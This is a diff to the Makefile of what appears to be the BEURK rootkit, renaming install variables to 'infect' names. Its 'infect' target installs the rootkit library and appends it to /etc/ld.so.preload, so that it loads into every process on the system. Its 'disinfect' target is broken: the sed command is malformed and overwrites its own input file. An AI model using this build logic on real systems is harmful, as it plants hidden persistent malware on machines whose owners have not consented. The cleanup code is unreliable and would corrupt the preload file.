@@ -6,18 +6,18 @@ SHELL				:= /bin/bash
 BEURK_CONFIG_FILE	?= beurk.conf
 BEURK_LIBRARY_NAME	?= $(shell grep -E '^LIBRARY_NAME[[:space:]]*=' $(BEURK_CONFIG_FILE) | cut -d= -f2 | xargs)
 BEURK_DEBUG_LEVEL	?= $(shell grep -E '^DEBUG_LEVEL[[:space:]]*=' $(BEURK_CONFIG_FILE) | cut -d= -f2 | xargs)
-BEURK_INSTALL_DIR	?= $(shell grep -E '^INSTALL_DIR[[:space:]]*=' $(BEURK_CONFIG_FILE) | cut -d= -f2 | xargs)
+BEURK_INFECT_DIR	?= $(shell grep -E '^INFECT_DIR[[:space:]]*=' $(BEURK_CONFIG_FILE) | cut -d= -f2 | xargs)
 
 # do not infect the system in debug mode
 ifneq ($(BEURK_DEBUG_LEVEL), 0)
     BEURK_LD_PRELOAD := /tmp/beurk/ld.so.preload
-    BEURK_INSTALL_DIR := /tmp/beurk
+    BEURK_INFECT_DIR := /tmp/beurk
 else
     BEURK_LD_PRELOAD := /etc/ld.so.preload
 endif
 
 # absolute install path
-BEURK_INSTALL_PATH	?= $(shell realpath -m $(BEURK_INSTALL_DIR)/$(BEURK_LIBRARY_NAME))
+BEURK_INFECT_ABSPATH	?= $(shell realpath -m $(BEURK_INFECT_DIR)/$(BEURK_LIBRARY_NAME))
 
 # compiler options
 INCLUDES	:= -Iincludes
@@ -109,17 +109,17 @@ install:
 
 # infect current system with the rootkit
 infect: $(BEURK_LIBRARY_NAME)
-	@echo "Install in $(BEURK_INSTALL_PATH)"
-	install -d $(BEURK_INSTALL_DIR)
-	install -m 755 $(BEURK_LIBRARY_NAME) $(BEURK_INSTALL_DIR)/
-	echo $(BEURK_INSTALL_PATH) >> $(BEURK_LD_PRELOAD)
+	@echo "Install in $(BEURK_INFECT_ABSPATH)"
+	install -d $(BEURK_INFECT_DIR)
+	install -m 755 $(BEURK_LIBRARY_NAME) $(BEURK_INFECT_DIR)/
+	echo $(BEURK_INFECT_ABSPATH) >> $(BEURK_LD_PRELOAD)
 	@echo "Successful infection"
 
 # uninstall the rootkit (if installed on current system)
 disinfect:
-	@echo "Uninstall $(BEURK_INSTALL_PATH)"
-	$(RM) $(BEURK_INSTALL_DIR)/$(BEURK_LIBRARY_NAME)
-	sed '#$(BEURK_INSTALL_PATH)#d' $(BEURK_LD_PRELOAD) > $(BEURK_LD_PRELOAD)
+	@echo "Uninstall $(BEURK_INFECT_ABSPATH)"
+	$(RM) $(BEURK_INFECT_DIR)/$(BEURK_LIBRARY_NAME)
+	sed '#$(BEURK_INFECT_ABSPATH)#d' $(BEURK_LD_PRELOAD) > $(BEURK_LD_PRELOAD)
 	@echo "Successful disinfection"
 
 # remove object files
